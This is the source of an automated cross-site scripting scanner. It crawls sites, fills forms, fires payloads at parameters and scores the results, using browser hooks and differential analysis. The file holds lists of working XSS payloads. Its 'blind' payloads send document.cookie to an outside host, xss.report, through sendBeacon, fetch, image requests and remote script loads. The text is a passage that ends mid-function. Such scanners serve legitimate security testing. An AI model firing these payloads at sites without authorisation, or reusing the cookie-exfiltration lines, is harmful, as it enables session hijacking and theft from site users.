import sys
import os
import re
import json
import time
import random
import logging
import asyncio
import difflib
import html
import socket
import argparse
import hashlib
import warnings
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qsl, urlunparse, urlencode, unquote
from typing import Any, Dict, List, Tuple, Optional, Set, Union, Awaitable, cast, TypedDict, Callable
from collections import OrderedDict
from itertools import chain
import aiohttp
from aiohttp import ClientTimeout, TCPConnector
from aiohttp.abc import AbstractResolver
import validators
import psutil
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import importlib.util
from playwright.async_api import async_playwright, BrowserContext, Page, TimeoutError as PlaywrightTimeoutError, Error as PlaywrightError

# --- INITIAL SETUP & LIBRARY CONFIGURATION ---

# 1. FIX: Set ProactorPolicy on Windows if necessary for asyncio stability.
if sys.platform == "win32":
    try:
        if isinstance(asyncio.get_event_loop_policy(), asyncio.WindowsSelectorEventLoopPolicy):
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except AttributeError:
        pass
    except Exception as e:
        print(f"Warning: Failed to set Windows event loop policy: {e}", file=sys.stderr)

# Optional uvloop integration (kept)
try:
    import uvloop
    if sys.platform != "win32":
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# LXML Parser Check (PERFORMANCE IMPROVEMENT)
try:
    import lxml
    BS_PARSER = "lxml"
except ImportError:
    BS_PARSER = "html.parser"

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TimeElapsedColumn, TimeRemainingColumn, TextColumn
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.theme import Theme
from rich import box

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

# --- CONFIGURATION (CF) ---

class Config(TypedDict, total=False):
    max_concurrency: int
    browser_concurrency: int
    adaptive_throttle: bool
    base_timeout: float
    browser_timeout: int
    browser_wait: float
    score_filter: int
    baseline_samples: int
    baseline_retries: int
    concurrent_requests: int
    debug_mode: bool
    max_payloads_per_param: int
    browser_batch_size: int
    verification_enabled: bool
    require_verification: bool
    blacklist_patterns: List[str]
    content_type_patterns: Dict[str, str]
    browser_user_agent: str
    output_dir: str
    realtime_file: str
    browser_type: str
    scan_mode: str
    crawl_depth: int
    host_concurrency_limit: int
    reflection_check_marker: str
    crawler_concurrency: int
    cache_ttl: int
    max_cache_size: int
    enable_path_injection: bool
    enable_differential_scoring: bool
    max_response_size: int
    fast_html_check: bool

CF: Config = {
    "max_concurrency": 7000,
    "browser_concurrency": 30,
    "adaptive_throttle": True,
    "base_timeout": 1.5,
    "browser_timeout": 15,
    "browser_wait": 4.0,
    "score_filter": 60,
    "baseline_samples": 2,
    "baseline_retries": 1,
    "concurrent_requests": 2000,
    "debug_mode": False,
    "max_payloads_per_param": 5000,
    "browser_batch_size": 1,
    "verification_enabled": True,
    "require_verification": False,
    "enable_path_injection": True,
    "enable_differential_scoring": True,
    "max_response_size": 5 * 1024 * 1024,
    "fast_html_check": False,
    "blacklist_patterns": [r"login", r"logout", r"delete", r"remove", r"token", r"csrf", r"session", r"passw", r"apikey", r"captcha", r"sessionid", r"cook"],
    "content_type_patterns": {
        "html": r"text/html|application/xhtml\+xml",
        "json": r"application/json|text/json|application/problem\+json",
        "javascript": r"application/javascript|text/javascript",
    },
    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 MetaXQuantumScanner/8.0", # Version updated
    "output_dir": "results_metax_quantum",
    "realtime_file": "metax_scan_realtime.json",
    "browser_type": "chromium",
    "scan_mode": "comprehensive",
    "crawl_depth": 5,
    "host_concurrency_limit": 50,
    "reflection_check_marker": "METAX_REFLECT_MARKER_",
    "crawler_concurrency": 500,
    "cache_ttl": 900,
    "max_cache_size": 20000,
}

# --- REMAINING CONSTANTS & INITIALIZATION (KEPT) ---

FIELD_CLASSIFICATION = {
    r'(user(name)?|uname|login|account(_name)?)': "scanner_user_99",
    r'(pass(word)?|pwd|passcode|secret|key|auth(_)?token|access[_-]?token|confirm[_-]?password)': "Password123ABC!",
    r'(mail|e[-_]?mail|email[_-]?address)': "test.user@metaxscan.io",
    r'(phone|tel|mobile|cell|contact[_-]?number)': "123-456-7890",
    r'(cc|credit[_-]?card|card[_-]?number|ccn)': "4000123456789010",
    r'(cvv|cvc|card[_-]?code)': "123",
    r'(iban|swift|bic|routing[_-]?number|bank[_-]?account|sort[_-]?code)': "DE44500105175407324931",
    r'(ssn|social[_-]?security)': "123-45-6789",
    r'(dob|birth[_-]?date|date[_-]?of[_-]?birth)': "1990-01-01",
    r'(zip|postal|post[_-]?code)': "90210",
    r'(addr(ess)?|street|city|state|province|country)': "123 Metax Lane",
    r'(name|full[_-]?name|first[_-]?name|last[_-]?name|given[_-]?name|surname)': "MetaX Scanner",
    r'(website|url|homepage)': "https://www.metaxscan.io",
    r'(company|org|organization|employer)': "MetaX Security",
    r'(comment|message|description|bio)': "This is a test input for MetaX scanner.",
    r'(search|query|keyword)': "metax xss fuzz",
    r'(id|identifier|ref|reference)': "MX-REQ-0001",
    r'.*': "default_data_metax"
}

RE_CONTEXT_BREAK_JS_BLOCKS = re.compile(r'<script[^>]*>(.*?)</script>', re.IGNORECASE | re.DOTALL)
RE_SCORE_LOG_LINE = re.compile(r"^([\dT:.-]+) \| ([A-Z_]+) \| (.*)$")
RE_JS_ENDPOINT = re.compile(r'["\'](?P<path>(?:https?:)?//[^"\'\s>]+|/[^\s"\'<>]*)["\']', re.IGNORECASE)
STATIC_EXTENSIONS = ('.js', '.css', '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', '.webp', '.map', '.woff', '.woff2', '.ttf', '.pdf', '.zip', '.mp4', '.mp3', '.xml', '.txt')
RE_JS_SINK_CALL = re.compile(r'\.(open|href|src|data|location)\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE | re.DOTALL)

def get_intelligent_default(name: str) -> str:
    name_lower = name.lower()
    for pattern, default_value in FIELD_CLASSIFICATION.items():
        if re.search(pattern, name_lower):
            return default_value
    return FIELD_CLASSIFICATION[r'.*']

def validate_config(config: Dict[str, Any]) -> None:
    required_keys = ["max_concurrency", "output_dir", "browser_type", "scan_mode", "cache_ttl", "max_cache_size"]
    for key in required_keys:
        if key not in config:
            raise ValueError(f"Missing required config key: {key}")

validate_config(CF)
Path(CF.get("output_dir")).mkdir(exist_ok=True)

custom_theme = Theme({
    "info": "bold bright_cyan",
    "success": "bold bright_green",
    "warning": "bold yellow",
    "error": "bold red",
    "step": "bold magenta",
    "param": "italic bright_blue",
    "highlight": "bold bright_yellow",
    "critical": "bold white on red",
    "debug": "dim white",
    "menu": "bold bright_magenta",
    "primary": "bold bright_magenta",
    "verified": "bold bright_green reverse",
    "unverified": "bold bright_red reverse"
})
console = Console(theme=custom_theme)

if BS_PARSER == "lxml":
    console.print("[info]⚡ LXML parser enabled for faster HTML processing.[/info]")
else:
    console.print("[warning]Slow 🐌: LXML not found. Install 'lxml' for a significant speed boost (pip install lxml).[/warning]")

LOG_LEVEL = logging.DEBUG if CF.get("debug_mode") else logging.INFO
logging.basicConfig(level=logging.WARNING, format="%(asctime)s [%(name)s] [%(levelname)s] %(message)s")
logger = logging.getLogger("metax_quantum")
logger.setLevel(LOG_LEVEL)

def timestamped_file(prefix: str, ext: str = "json") -> Path:
    return Path(CF.get("output_dir")) / f"{prefix}_{time.strftime('%Y%m%d_%H%M%S')}.{ext}"

def is_interesting(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ["http", "https"]:
            return False
        if parsed.path.lower().endswith(STATIC_EXTENSIONS) and not (parsed.query or parsed.fragment):
            return False
        if parsed.query or parsed.fragment:
            return True
        if not re.search(r'\.[a-z0-9]{2,4}$', parsed.path.lower()):
            return True
        return True
    except Exception:
        return False

def normalize_url(url: str, ignore_query: bool = False, ignore_fragment: bool = True) -> str:
    parsed = urlparse(url)
    
    query = sorted(parse_qsl(parsed.query, keep_blank_values=True))
    normalized_query = urlencode(query, safe='()<>')

    path = parsed.path
    if path and path.endswith('/') and path != '/':
        path = path.rstrip('/')
    
    if not path.startswith('/') and parsed.netloc:
        path = '/' + path
    if not path:
        path = '/'
            
    return urlunparse(parsed._replace(
        path=path,
        query="" if ignore_query else normalized_query,
        fragment='' if ignore_fragment else parsed.fragment
    ))

def is_same_scope(base_url: str, new_url: str) -> bool:
    try:
        base_host = urlparse(base_url).netloc.split(":")[0]
        new_host = urlparse(new_url).netloc.split(":")[0]
        if not base_host or not new_host:
            return False
        return (base_host == new_host) or new_host.endswith(f".{base_host}") or new_host.startswith(f"{base_host}.")
    except Exception:
        return False

# --- DETECTION & ACCURACY IMPROVEMENTS ---

class AdvancedSmartDetection:
    @staticmethod
    async def analyze_context(html_content: str) -> Dict[str, Any]:
        return await asyncio.to_thread(AdvancedSmartDetection._analyze_context_sync, html_content)

    @staticmethod
    def _analyze_context_sync(html_content: str) -> Dict[str, Any]:
        triggers = ["alert(", "confirm(", "prompt(", "onerror=", "onload=", "javascript:", "onmouseover=", "onfocus=", "onchange=", "document.cookie", "eval(", "setTimeout(", "setInterval("]
        trigger_count = sum(html_content.lower().count(trigger) for trigger in triggers)
        confidence = min(1.0, trigger_count / 10.0)
        return {"confidence": confidence, "trigger_count": trigger_count}

    @staticmethod
    async def check_context_break(response: str, token: str) -> Dict[str, int]:
        return await asyncio.to_thread(AdvancedSmartDetection._check_context_break_sync, response, token)

    @staticmethod
    def _check_context_break_sync(response: str, token: str) -> Dict[str, int]:
        scores = {}
        token_escaped = re.escape(token)
            
        if re.search(fr'{token_escaped}\s+(on[a-z]+)=', response, re.IGNORECASE):
            scores['unquoted_attr'] = 50
            
        if re.search(fr'{token_escaped}[^\s]*\s*["\']?\s*[>]\s*<', response, re.IGNORECASE):
            scores['html_tag_break_high'] = 40
            
        if re.search(fr'["\']\s*[;]\s*//', response, re.IGNORECASE):
            scores['js_string_break'] = 30
            
        if re.search(fr'{token_escaped}[\'"]?\s*[}}\]]\s*<script', response, re.IGNORECASE | re.DOTALL):
            scores['json_script_break'] = 35
            
        js_blocks = RE_CONTEXT_BREAK_JS_BLOCKS.findall(response)
        if any(token in block for block in js_blocks):
            scores['js_raw'] = 10
            
        return scores

    @staticmethod
    def reduce_false_positives(score: int, payload: str, is_raw_reflected: bool) -> int:
        if is_raw_reflected and payload.startswith(('"><', '\'"><', '`<')) and score < 70:
            score = int(score * 0.7)

        if score < 50 and any(p in payload.lower() for p in ['metax', 'script', 'img', 'svg']):
            score = int(score * 0.8)
            
        if score >= 80 and payload.startswith(('<', 'javas')) and not is_raw_reflected and not is_raw_reflected:
             score = int(score * 0.8) 
            
        return max(0, score)

class PluginManager:
    def __init__(self, plugins_dir: str = "plugins") -> None:
        self.plugins: List[Callable] = []
        self.plugins_dir = plugins_dir
        self.load_plugins()

    def load_plugins(self) -> None:
        if not os.path.isdir(self.plugins_dir):
            return
        for file in os.listdir(self.plugins_dir):
            if file.endswith(".py"):
                try:
                    module_name = file[:-3]
                    spec = importlib.util.spec_from_file_location(module_name, os.path.join(self.plugins_dir, file))
                    if spec is None or spec.loader is None: continue
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    if hasattr(module, "run"):
                        self.plugins.append(cast(Callable, module.run))
                        logger.debug(f"Loaded plugin: {module_name}")
                except Exception as e:
                    logger.warning(f"Plugin error in {file}: {e}")

    def run_plugins(self, vuln_result: "VulnResult") -> None:
        for plugin in self.plugins:
            try:
                plugin(vuln_result)
            except Exception as e:
                logger.error(f"Plugin error during execution: {e}")

class BuiltinResolver(AbstractResolver):
    async def resolve(self, host: str, port: int = 0, family: int = socket.AF_INET) -> List[Dict[str, Any]]:
        loop = asyncio.get_running_loop()
        infos = await loop.getaddrinfo(host, port, type=socket.SOCK_STREAM, family=socket.AF_INET, proto=0)
        return [{"hostname": host, "host": a[0], "port": a[1], "family": fam, "proto": pr, "flags": 0} for (fam, _, pr, _, a) in infos]
    async def close(self) -> None:
        pass

class LRUCache:
    def __init__(self, capacity: int, ttl: int) -> None:
        self.capacity: int = capacity
        self.ttl: int = ttl
        self.cache: OrderedDict[Any, Any] = OrderedDict()
        
    def get(self, key: Any) -> Optional[Tuple[str, Dict[str, Any], float]]:
        cached = self.cache.get(key)
        if cached:
            timestamp, baseline, metadata, avg_latency = cached
            if time.time() - timestamp < self.ttl:
                self.cache.move_to_end(key)
                return baseline, metadata, avg_latency
            else:
                del self.cache[key]
        return None
        
    def set(self, key: Any, baseline: str, metadata: Dict[str, Any], avg_latency: float) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        self.cache[key] = (time.time(), baseline, metadata, avg_latency)
        if len(self.cache) > self.capacity:
            self.cache.popitem(last=False)

class PayloadManager:
    
    BASE_PAYLOADS: List[str] = [
        '"><svg/onload=alert(1)>',
        '"><script>Function("al"+"ert(1)")()</script>',
        '"><img src=x onerror=alert(1)>',
        '"><iframe srcdoc="<script>alert(1)</script>">',
        '"><body onload=alert(1)>',
        '"><iframe src="javascript:alert(1)">',
        '"><input autofocus onfocus=alert(1)>',
        '1\'"><img/src/onerror=alert(1)>',
        '"><img src=x onerror=alert(document.domain)>',
        'test"><img src=x onerror=alert(document.cookie)><script>alert(1)</script>',
        '"><video src=x onerror=prompt(1)>',
        '"><body onpageshow=confirm(1)>',
        '"><a href=javascript:alert(1)>XSS</a>',
        '\'"-confirm(1)-"',
    ]

    ADVANCED_PAYLOADS: List[str] = [
        '"><details open ontoggle=alert(1)>',
        '"><img src=x onerror=alert(1) />',
        '\\"><svg/onload=alert(1)>',
        'javascript:void(0)//\'"/*-/*`/*\'/*`*/onmouseover=alert(1)>',
        '`<svg onload=alert(1)>`',
        '"><video src=x onerror=alert(1)>',
        '"><div contenteditable onfocus=alert(1)>edit me</div>',
        '"><select autofocus onfocus=alert(1)>',
        '"><div onmouseover=alert(1)>hover</div>',
        '"><button onmouseover=alert(1)>Hover</button>',
        '"><div onmouseover=prompt(1)>HOVER CONFIRM</div>',
        '"><input autofocus onfocus=confirm(1)>',
        '"><svg/onload=prompt`1`>',
        '"><svg/onload=confirm.call`1`>',
        '"><a href="javascript:void(0)" onclick=prompt(1)>Click for Prompt</a>',
        '"><a href=j&#97;v&#97;s&#99;r&#105;p&#116;:confirm(1)>Click (HTML Encoded)</a>',
        '"><table background="javascript:prompt(1)">',
        '"><script>window[atob("cHJvbXB0")](1)</script>',
        '"><script>[1].find(prompt)</script>',
        '"><form onsubmit=confirm(1)><input type=submit value=Click>',
        '<test<img src=x onerror=alert(1)//',
        '"><script>eval(atob("YWxlcnQoMSk="))</script>',
        '\\u0027\\u0022\\u003e\\u003csvg/onload=alert(1)>', 
    ]
    
    CONTEXT_PAYLOADS: Dict[str, List[str]] = {
        "html": [
            '"><a href="#" onclick="prompt(1)">click</a>',
            '"><script>confirm\n(1)</script>',
            '%27"<K><Img/Src/OnError=confirm(1)>',
            '"><details ontoggle=prompt(1) open>',
            '"><form onsubmit=confirm(1)><input type=submit>',
            '"><img src=x onerror="var f=this.src,p=\'prompt\';window[p](1)">',
            '"><abbr title="<script>confirm(1)"></abbr>',
            '"><style>img{width:100%;height:100%}#xss{background:url("javascript:prompt(1)");}</style><div id="xss"></div>',
        ],
        "href": [
            'javascript:prompt(1)',
            'data:text/html,<script>confirm(1)</script>',
            'javascript:window.confirm("XSS")',
            'data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=',
            'j&#97;v&#97;s&#99;r&#105;p&#116;&#58;prompt(1)',
            '//xss.report/?#<script>prompt(1)</script>',
        ],
        "json": [
            '\\":;/*-/*`\'*/<svg/onload=alert(1)>',
            '\\":;/*-/*`\'*/<img src=x onerror=alert(1)>',
            'test@example.com\\">',
            'null',
            '{"key":"value"}',
            'true',
            '123',
            '</textarea></script><svg/onload=alert(1)>',
        ]
    }
    
    BLIND_PAYLOADS: List[str] = [
        '\'""><script src="https://xss.report/c/or0to"></script>',
        '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;var a=document.createElement(\'script\');a.src=\'https://xss.report/c/or0to\';document.body.appendChild(a);&#60;/script&#62;">',
        '"><img src="//xss.report/c/or0to?c=MetaX_{rand}&d="+document.cookie>',
        '"><script>navigator.sendBeacon("https://xss.report/c/or0to", document.cookie)</script>',
        '"><svg/onload=fetch(`https://xss.report/c/or0to?d=${prompt(document.cookie)}`)>',
        '"><script>if(confirm(document.domain)){window.location="https://xss.report/c/or0to"}</script>',
        '\'"//<script>document.location="https://xss.report/c/or0to?c="+document.cookie+"&p="+prompt(1)</script>',
        '"><details ontoggle=confirm(1) open>',
    ]

    PATH_PAYLOADS: List[str] = [
        '%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253a%2563%256f%256e%2566%2569%2572%256d%2528%2531%2529',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=',
    ]

    @staticmethod
    def _create_token() -> str:
        rand_digits = str(random.randint(10000, 99999))
        hex_hash = hashlib.sha256(os.urandom(8)).hexdigest()[:8]
        return f"MetaX{rand_digits}_{hex_hash}"

    @staticmethod
    def _replace_rand(payload_template: str, token: Optional[str] = None) -> Tuple[str, str]:
        if token is None:
            token = PayloadManager._create_token()
            
        token_str_literal = f"'{token}'"
        token_str_backtick = f"`{token}`"
        
        final_payload = payload_template
        
        for func_name in ["alert", "prompt", "confirm"]:
            final_payload = final_payload.replace(f"{func_name}(1)", f"{func_name}({token_str_literal})")
            final_payload = final_payload.replace(f"{func_name}`1`", f"{func_name}{token_str_backtick}")
            
        final_payload = final_payload.replace("confirm.call`1`", f"confirm.call{token_str_backtick}")
        final_payload = final_payload.replace('confirm("XSS")', f"confirm({token_str_literal})")
        
        final_payload = final_payload.replace("javascript:prompt(1)", f"javascript:prompt({token_str_literal})")
        final_payload = final_payload.replace("javascript:confirm(1)", f"javascript:confirm({token_str_literal})")
        
        final_payload = final_payload.replace("alert(document.domain)", f"alert('DOM_EXFIL_{token}')")
        final_payload = final_payload.replace("alert(document.cookie)", f"alert('COOKIE_EXFIL_{token}')")
        final_payload = final_payload.replace("alert``", f"alert{token_str_backtick}")
        final_payload = final_payload.replace("“><s”%2b”cript>alert(document.cookie)</script>", f'"%2b"script>alert(\'COOKIE_EXFIL_{token}\')</script>')
        
        final_payload = final_payload.replace("MetaX_{rand}", token)
        if "{rand}" in final_payload:
            numeric_part = "".join(filter(str.isdigit, token))
            final_payload = final_payload.replace("{rand}", numeric_part)
            
        return final_payload, token

    @classmethod
    def generate_all_payload_tuples(cls) -> List[Tuple[str, str]]:
        payload_templates = set(
            cls.BASE_PAYLOADS +
            cls.ADVANCED_PAYLOADS +
            cls.CONTEXT_PAYLOADS.get("html", []) +
            cls.CONTEXT_PAYLOADS.get("href", []) +
            cls.BLIND_PAYLOADS +
            cls.PATH_PAYLOADS
        )
        unique_payloads: List[Tuple[str, str]] = []
        for p in sorted(list(payload_templates)):
            unique_payloads.append(cls._replace_rand(p))
        return unique_payloads
        
# Browser hook (Kept)
BROWSER_HOOK = r"""
window.__METAXLOG = [];
(function() {
    const PAYLOAD_MARKER = 'MetaX';
    const OOB_ENDPOINT_MARKER = 'xss.report';
    
    function log(type, msg) {
        if ((msg && msg.includes(PAYLOAD_MARKER)) || (type.includes("OOB_ATTEMPT")) || type.includes("ALERT_CALL") || type.includes("PROMPT_CALL") || type.includes("CONFIRM_CALL")) {
            window.__METAXLOG.push(new Date().toISOString() + " | " + type + " | " + msg);
        }
    }

    const originalAlert = window.alert;
    window.alert = function(msg) {
        log("ALERT_CALL", String(msg));
        return originalAlert.apply(this, arguments);
    };

    const originalConfirm = window.confirm;
    window.confirm = function(msg) {
        log("CONFIRM_CALL", String(msg));
        return originalConfirm.apply(this, arguments);
    };

    const originalPrompt = window.prompt;
    window.prompt = function(msg) {
        log("PROMPT_CALL", String(msg));
        return originalPrompt.apply(this, arguments);
    };
    
    const originalSetTimeout = window.setTimeout;
    window.setTimeout = function(code, delay) {
        if (typeof code === 'string' && code.includes(PAYLOAD_MARKER)) {
            log("ASYNC_SET_TIMEOUT", code);
        }
        return originalSetTimeout.apply(this, arguments);
    };

    const originalEval = window.eval;
    window.eval = function(code) {
        if (code && code.includes(PAYLOAD_MARKER)) {
            log("ASYNC_EVAL_CALL", code);
        }
        return originalEval.apply(this, arguments);
    };

    const originalFetch = window.fetch;
    window.fetch = function() {
        const input = arguments[0];
        const init = arguments[1];
        const url = (typeof input === 'string') ? input : input.url || input;
        if (url && (url.includes(OOB_ENDPOINT_MARKER) || url.includes(PAYLOAD_MARKER))) {
            log("XHR_FETCH_OOB_ATTEMPT", "URL: " + url + ", Init: " + JSON.stringify(init || {}));
        }
        return originalFetch.apply(this, arguments);
    };
    
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (url && (url.includes(OOB_ENDPOINT_MARKER) || url.includes(PAYLOAD_MARKER))) {
            log("XHR_FETCH_OOB_ATTEMPT", "Method: " + method + ", URL: " + url);
        }
        originalOpen.apply(this, arguments);
    };

    const observer = new MutationObserver(function(mutationsList) {
        for (const mutation of mutationsList) {
            if (mutation.type === 'childList') {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType === 1 && node.outerHTML && node.outerHTML.includes(PAYLOAD_MARKER)) {
                        log("DOM_INJECTION", "Element: " + (node.tagName || 'TEXT') + ", HTML: " + node.outerHTML.substring(0, 100) + "...");
                    }
                });
            } else if (mutation.type === 'attributes' && mutation.target.outerHTML.includes(PAYLOAD_MARKER)) {
                log("ATTRIBUTE_CHANGE", "Attribute on: " + mutation.target.tagName + ", HTML: " + mutation.target.outerHTML.substring(0, 100) + "...");
            }
        }
    });
    
    function observe_dom() {
        if (document.documentElement) {
             observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeOldValue: false, characterData: false });
        } else {
            window.requestAnimationFrame(observe_dom);
        }
    }
    window.requestAnimationFrame(observe_dom);

    log("MONITOR_STATUS", "metax-monitor-initialized and watching for events");
})();
"""

# --- PERFORMANCE/SPEED (AdaptiveScheduler and RequestManager) ---

class AdaptiveScheduler:
    """Dynamically adjusts concurrency based on system load (CPU/Memory)."""
    @staticmethod
    def concurrency(max_val: int, check_interval: float = 0.5) -> int:
        if not CF.get("adaptive_throttle"):
            return max_val
        
        try:
            # Use interval=0 for instantaneous check, as it's called frequently
            cpu = psutil.cpu_percent(interval=0) 
            mem = psutil.virtual_memory().percent
            
            factor = 1.0
            if cpu > 70 or mem > 90:
                factor = 0.1 # Aggressive throttle if resources are near exhaustion
            elif cpu > 50 or mem > 80:
                factor = 1.0 - (cpu * 0.005) - (mem * 0.005) # Moderate throttle
            
            factor = max(0.1, min(1.0, factor))
                  
            return max(1, int(max_val * factor))
        except Exception:
            return max_val

def get_system_stats() -> Dict[str, Union[float, int]]:
    """Fetches current CPU/Mem usage."""
    try:
        cpu = psutil.cpu_percent(interval=None)
        mem = psutil.virtual_memory().percent
        max_concurrency = CF.get("concurrent_requests")
        current_concurrency = AdaptiveScheduler.concurrency(max_concurrency)
        
        return {
            "cpu": cpu,
            "memory": mem,
            "max_conc": max_concurrency,
            "current_conc": current_concurrency
        }
    except Exception:
        return {"cpu": 0.0, "memory": 0.0, "max_conc": 0, "current_conc": 0}


class ScoreEngine:
    DYNAMIC_SCORE_MATRIX: Dict[str, Tuple[int, str]] = {
        "ALERT_CALL": (100, "CRITICAL"),
        "CONFIRM_CALL": (100, "CRITICAL"),
        "PROMPT_CALL": (100, "CRITICAL"),
        "ASYNC_EVAL_CALL": (98, "CRITICAL"),
        "XHR_FETCH_OOB_ATTEMPT": (95, "HIGH"),
        "SEND_BEACON_OOB_ATTEMPT": (90, "HIGH"),
        "DOM_INJECTION": (85, "HIGH"),
        "ATTRIBUTE_CHANGE": (80, "HIGH"),
        "ASYNC_SET_TIMEOUT": (70, "MEDIUM"),
        "CONTEXT_BREAK_DETECTED": (75, "MEDIUM"),
        "TOKEN_REFLECTION_ONLY": (20, "LOW"),
        "MONITOR_STATUS": (0, "INFO"),
    }

    @staticmethod
    def _parse_log_line(log_line: str) -> Optional[Dict[str, Any]]:
        match = RE_SCORE_LOG_LINE.match(log_line)
        if match:
            return {
                "timestamp": match.group(1),
                "event_type": match.group(2),
                "message": match.group(3)
            }
        return None

    @staticmethod
    def _perform_static_analysis_sync(html_content: str) -> Dict[str, Any]:
        results: Dict[str, Any] = {"structure": "", "event_handlers": [], "stripped_text": ""}
        try:
            if not isinstance(html_content, str): return results

            soup = BeautifulSoup(html_content, BS_PARSER)
            
            if not CF.get("enable_differential_scoring", True) and CF.get("fast_html_check", True):
                event_handlers = []
                for tag in soup.find_all(True):
                    if any(attr.startswith('on') for attr in tag.attrs):
                        event_handlers.extend(f"{attr}={value}" for attr, value in tag.attrs.items() if attr.startswith('on'))
                results['event_handlers'] = event_handlers
                return results

            structural_tags = ['head', 'body', 'div', 'p', 'table', 'ul', 'ol', 'form', 'a', 'script', 'style', 'input', 'button', 'iframe']
            results['structure'] = " ".join(tag.name for tag in soup.find_all(lambda tag: tag.name in structural_tags))
            
            event_handlers = []
            for tag in soup.find_all(True):
                for attr, value in tag.attrs.items():
                    if attr.startswith('on'):
                        event_handlers.append(f"{attr}={value}")
            results['event_handlers'] = event_handlers
            
            temp_soup = BeautifulSoup(html_content, BS_PARSER)
            for tag in temp_soup(["script", "style", "noscript", "iframe", "svg", "object", "embed", "form", "input", "button", "header", "footer", "nav", "img", "a"]):
                tag.decompose()
            results['stripped_text'] = temp_soup.get_text(" ", strip=True)

        except Exception as e:
            logger.debug(f"Static analysis sync failed: {e}")

        return results
        
    @classmethod
    async def compute_score(cls, payload: str, token: str, baseline: str, response: str,
                             base_latency: float, resp_latency: float, metadata: Dict[str, Any]) -> Tuple[int, str]:
        
        norm_payload = payload.strip()
        norm_response = response or ""
        norm_baseline = baseline or ""
        
        comp = {k: 0 for k in ["reflection", "difference", "structure", "context", "event_handler", "heuristic", "latency", "advanced", "context_break"]}
        reasons = []

        max_exec_score = 0
        browser_logs = metadata.get("browser_logs", [])
        is_verified_dialog = metadata.get("verified_dialog", False)
        
        # --- PHASE 0: Calculate initial reflection status ---
        raw_reflected = token in norm_response
        html_reflected = html.unescape(token) in norm_response

        # --- PHASE 1: Browser Execution Heuristics (Highest Confidence) ---
        if is_verified_dialog:
            max_exec_score = 100
            reasons.append("BROWSER_DIALOG_VERIFIED (+100)")
        else:
            for log_line in browser_logs:
                parsed = cls._parse_log_line(log_line)
                if not parsed: continue
                event_type = parsed["event_type"]
                score, _ = cls.DYNAMIC_SCORE_MATRIX.get(event_type, (0, ""))
                
                if token in parsed["message"] or event_type.startswith(("XHR_FETCH_OOB", "SEND_BEACON_OOB")):
                    max_exec_score = max(max_exec_score, score)

        comp["heuristic"] = max_exec_score
        if max_exec_score > 0 and not is_verified_dialog: reasons.append(f"EXECUTION_HEURISTIC (+{max_exec_score})")

        # --- PHASE 2: Static Analysis ---
        raw_score = 0
        static_analysis_resp = {}
        # Only run static analysis if we have a response
        if max_exec_score < 100 and norm_response: 
            http_status = metadata.get('http_status', 200)
            target_param_type = metadata.get('target_param_type', 'UNKNOWN')
            content_type = metadata.get("content_type", "")

            if raw_reflected:
                comp["reflection"] += 40
                reasons.append("Raw_Token_Reflected (+40)")
            elif html_reflected:
                comp["reflection"] += 30
                reasons.append("HTML_Decoded_Token_Reflected (+30)")

            if norm_payload in norm_response:
                comp["advanced"] += 30
                reasons.append("Payload_Intact_in_Response (+30)")
            elif html.unescape(norm_payload) in norm_response:
                comp["advanced"] += 15
                reasons.append("HTML_Decoded_Payload_Intact (+15)")

            context_scores = await AdvancedSmartDetection.check_context_break(norm_response, token)
            score_sum = sum(context_scores.values())
            if score_sum:
                comp["context_break"] += score_sum
                reasons.append(f"Context_Break (+{score_sum})")
            
            if target_param_type == "PATH" and (http_status >= 400 or (raw_reflected or html_reflected)):
                adjusted_cap_score = 25
                raw_score = adjusted_cap_score
                reasons.append(f"Path_FP_Suppression (Capped at {adjusted_cap_score})")
            
            # Differential Scoring
            elif CF.get("enable_differential_scoring", True) and norm_baseline and http_status in range(200, 300):
                static_analysis_resp = await asyncio.to_thread(cls._perform_static_analysis_sync, norm_response)
                static_analysis_base = await asyncio.to_thread(cls._perform_static_analysis_sync, norm_baseline)

                base_text = static_analysis_base.get('stripped_text', "")
                resp_text = static_analysis_resp.get('stripped_text', "")
                
                if base_text and resp_text:
                    text_diff = difflib.SequenceMatcher(None, base_text, resp_text).ratio()
                    html_score = int((1 - text_diff) * 30)
                    comp["difference"] += html_score
                    reasons.append(f"Text_Diff_Score (+{html_score})")

                struct1 = static_analysis_base.get('structure', "")
                struct2 = static_analysis_resp.get('structure', "")
                
                if struct1 and struct2:
                    struct_ratio = difflib.SequenceMatcher(None, struct1, struct2).ratio()
                    if struct_ratio < 0.98:
                        struct_score = int((1 - struct_ratio) * 35)
                        comp["structure"] += struct_score
                        reasons.append(f"DOM_Structure_Diff (+{struct_score})")
                        
                dynamic_content = metadata.get("dynamic_content", 0.0)
                if dynamic_content > 0.1:
                    discount = min(25, int(dynamic_content * 35))
                    comp["difference"] = max(0, comp["difference"] - discount)
                    comp["structure"] = max(0, comp["structure"] - int(discount * 0.75))
                    reasons.append(f"Dynamic_Page_Penalty (-{discount})")
            
            # Non-Differential / Fast Check
            elif http_status in range(200, 300) and 'html' in content_type:
                static_analysis_resp = await asyncio.to_thread(cls._perform_static_analysis_sync, norm_response)
                reasons.append("Non-Differential_Scoring (+0)")
